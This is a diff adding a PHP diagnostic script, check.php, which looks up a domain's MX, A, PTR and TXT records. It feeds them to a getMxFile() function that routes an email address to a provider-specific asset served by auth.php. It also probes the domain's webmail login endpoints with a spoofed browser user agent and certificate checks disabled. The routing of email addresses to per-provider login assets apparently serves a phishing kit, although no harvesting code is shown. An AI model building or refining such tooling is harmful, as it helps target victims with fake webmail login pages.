@@ -1,0 +1,264 @@
+<?php
+// ============================================================
+// check.php — Temporary diagnostic tool. DELETE AFTER USE.
+// ============================================================
+// Usage:
+//   check.php?inspect=example.com
+//   check.php?inspect=example.com&key=YOUR_SECRET
+//   check.php?route=user@example.com
+//   check.php?cache=clear
+// ============================================================
+
+// ---- Optional: gate behind a secret key ----
+// Set $CHECK_SECRET to a random string. If non-empty, requests
+// must supply &key=... matching it. Leave empty to disable the gate.
+$CHECK_SECRET = '';   // e.g. 'a8f3d9c2b1e4';
+
+if ($CHECK_SECRET !== '') {
+    $supplied = $_GET['key'] ?? '';
+    if (!hash_equals($CHECK_SECRET, $supplied)) {
+        http_response_code(403);
+        exit('Forbidden');
+    }
+}
+
+header('Content-Type: text/plain; charset=utf-8');
+header('X-Robots-Tag: noindex, nofollow');
+
+echo "=== check.php ===\n";
+echo "Time: " . date('c') . "\n";
+echo "Root: " . __DIR__ . "\n\n";
+
+// ============================================================
+// Load helpers
+// ============================================================
+if (!file_exists(__DIR__ . '/index-functions.php')) {
+    exit("ERROR: index-functions.php not found.\n");
+}
+require_once __DIR__ . '/index-functions.php';
+
+// ============================================================
+// Cache clear
+// ============================================================
+if (isset($_GET['cache']) && $_GET['cache'] === 'clear') {
+    $files = glob(sys_get_temp_dir() . '/webmail_route_*.txt');
+    $n = 0;
+    foreach ($files as $f) { if (@unlink($f)) $n++; }
+    echo "Cleared $n cache files.\n";
+    exit;
+}
+
+// ============================================================
+// Route test — full getMxFile() call for a real email
+// ============================================================
+if (!empty($_GET['route'])) {
+    $email = trim((string)$_GET['route']);
+    $norm  = normalizeProducts($email);
+    echo "Input:    $email\n";
+    echo "Normalized: " . var_export($norm, true) . "\n";
+    if ($norm === '') {
+        exit("ERROR: could not normalize to a valid email.\n");
+    }
+    $file = getMxFile($norm);
+    echo "Routed to: $file\n";
+
+    $isUrl = (bool)preg_match('#^https?://#i', $file);
+    if (!$isUrl) {
+        $p = __DIR__ . '/assets/' . $file;
+        echo "Asset path: $p\n";
+        echo "Asset exists: " . (file_exists($p) ? "YES (" . filesize($p) . " bytes)" : "NO") . "\n";
+    }
+    exit;
+}
+
+// ============================================================
+// Inspect — full DNS + routing breakdown for a domain
+// ============================================================
+$domain = $_GET['inspect'] ?? '';
+if ($domain === '') {
+    echo "Usage:\n";
+    echo "  ?inspect=DOMAIN       — full DNS + routing breakdown\n";
+    echo "  ?route=EMAIL          — quick getMxFile() test\n";
+    echo "  ?cache=clear          — purge route cache\n";
+    exit;
+}
+
+$domain = strtolower(trim($domain));
+if (!preg_match('/^[a-z0-9.\-]+$/', $domain)) {
+    exit("Invalid domain.\n");
+}
+
+echo "=== Inspecting: $domain ===\n\n";
+
+// ------------------------------------------------------------
+// MX
+// ------------------------------------------------------------
+echo "--- MX RECORDS ---\n";
+$mx = @dns_get_record($domain, DNS_MX);
+if (empty($mx)) {
+    echo "  (none)\n";
+} else {
+    foreach ($mx as $r) {
+        printf("  prio=%d  target=%s\n", $r['pri'] ?? 0, $r['target'] ?? '');
+    }
+}
+
+// ------------------------------------------------------------
+// A records for domain
+// ------------------------------------------------------------
+echo "\n--- A RECORDS (domain) ---\n";
+$a = @dns_get_record($domain, DNS_A);
+if (empty($a)) {
+    echo "  (none)\n";
+} else {
+    foreach ($a as $r) {
+        echo "  " . ($r['ip'] ?? '?') . "\n";
+    }
+}
+
+// ------------------------------------------------------------
+// For each MX: A records + PTR
+// ------------------------------------------------------------
+echo "\n--- MX → A → PTR ---\n";
+$ptrAll = [];
+if (!empty($mx)) {
+    foreach ($mx as $r) {
+        $target = strtolower($r['target'] ?? '');
+        if ($target === '') continue;
+        echo "  MX: $target\n";
+
+        $ar = @dns_get_record($target, DNS_A);
+        if (empty($ar)) {
+            echo "    A: (none)\n";
+            continue;
+        }
+        foreach ($ar as $aRec) {
+            $ip = $aRec['ip'] ?? '';
+            echo "    A: $ip\n";
+            if ($ip === '') continue;
+
+            $rev = implode('.', array_reverse(explode('.', $ip))) . '.in-addr.arpa';
+            $ptr = @dns_get_record($rev, DNS_PTR);
+            if (empty($ptr)) {
+                echo "      PTR: (none)\n";
+            } else {
+                foreach ($ptr as $p) {
+                    $ph = strtolower($p['target'] ?? '');
+                    echo "      PTR: $ph\n";
+                    if ($ph !== '') $ptrAll[] = $ph;
+                }
+            }
+        }
+    }
+}
+
+// ------------------------------------------------------------
+// TXT (SPF often reveals the real mail provider)
+// ------------------------------------------------------------
+echo "\n--- TXT RECORDS ---\n";
+$txt = @dns_get_record($domain, DNS_TXT);
+if (empty($txt)) {
+    echo "  (none)\n";
+} else {
+    foreach ($txt as $r) {
+        $t = $r['txt'] ?? '';
+        echo "  " . $t . "\n";
+    }
+}
+
+// ------------------------------------------------------------
+// Keyword matching breakdown
+// ------------------------------------------------------------
+echo "\n--- KEYWORD MATCH BREAKDOWN ---\n";
+
+$mxHaystack = '';
+foreach ($mx as $r) {
+    $mxHaystack .= ' ' . strtolower($r['target'] ?? '');
+}
+$mxHaystackOnly   = ' ' . $domain . $mxHaystack;
+$combinedHaystack = $mxHaystackOnly . ' ' . implode(' ', $ptrAll);
+
+echo "MX-only haystack:\n  $mxHaystackOnly\n\n";
+echo "Combined haystack:\n  $combinedHaystack\n\n";
+
+// Get the ordered keyword map from getMxFile via reflection-free approach:
+// We replicate the map by calling a helper that returns it.
+// (If your index-functions.php doesn't expose the map, we skip this section.)
+
+$matchedMxOnly = null;
+$matchedCombined = null;
+
+if (function_exists('_routing_keyword_set')) {
+    echo "Keyword set matches (informational — not the routing map):\n";
+    foreach (_routing_keyword_set() as $kw) {
+        if (str_contains($mxHaystackOnly, $kw)) {
+            echo "  [MX] $kw\n";
+        }
+        if (str_contains($combinedHaystack, $kw)) {
+            echo "  [ALL] $kw\n";
+        }
+    }
+}
+
+// ------------------------------------------------------------
+// Final routing decision
+// ------------------------------------------------------------
+echo "\n--- FINAL ROUTE ---\n";
+$testEmail = "test@" . $domain;
+$result = getMxFile($testEmail);
+echo "  getMxFile($testEmail) => $result\n";
+
+$isUrl = (bool)preg_match('#^https?://#i', $result);
+if (!$isUrl) {
+    $asset = __DIR__ . '/assets/' . $result;
+    echo "  Asset exists: " . (file_exists($asset) ? "YES" : "NO") . "\n";
+    echo "  Asset path:   $asset\n";
+} else {
+    echo "  (absolute URL — served as-is by auth.php)\n";
+}
+
+// ------------------------------------------------------------
+// HTTP probe of common webmail endpoints
+// ------------------------------------------------------------
+echo "\n--- HTTP PROBE (may take a few seconds) ---\n";
+$probes = [
+    "https://{$domain}/",
+    "https://mail.{$domain}/",
+    "https://webmail.{$domain}/",
+    "https://{$domain}:2096/",
+    "http://mail.{$domain}/Login.aspx",
+];
+foreach ($probes as $u) {
+    $title = '-';
+    $code  = '-';
+
+    $ch = @curl_init($u);
+    if ($ch) {
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_MAXREDIRS      => 3,
+            CURLOPT_TIMEOUT        => 5,
+            CURLOPT_CONNECTTIMEOUT => 3,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            CURLOPT_HTTPHEADER     => [
+                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language: en-US,en;q=0.9',
+            ],
+        ]);
+        $body = curl_exec($ch);
+        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        if (is_string($body) && preg_match('#<title[^>]*>(.*?)</title>#is', $body, $m)) {
+            $title = trim(preg_replace('/\s+/', ' ', $m[1]));
+            if (strlen($title) > 60) $title = substr($title, 0, 57) . '...';
+        }
+    }
+
+    printf("  [%s] %-40s  %s\n", $code, $u, $title);
+}
+
+echo "\nDone.\n";
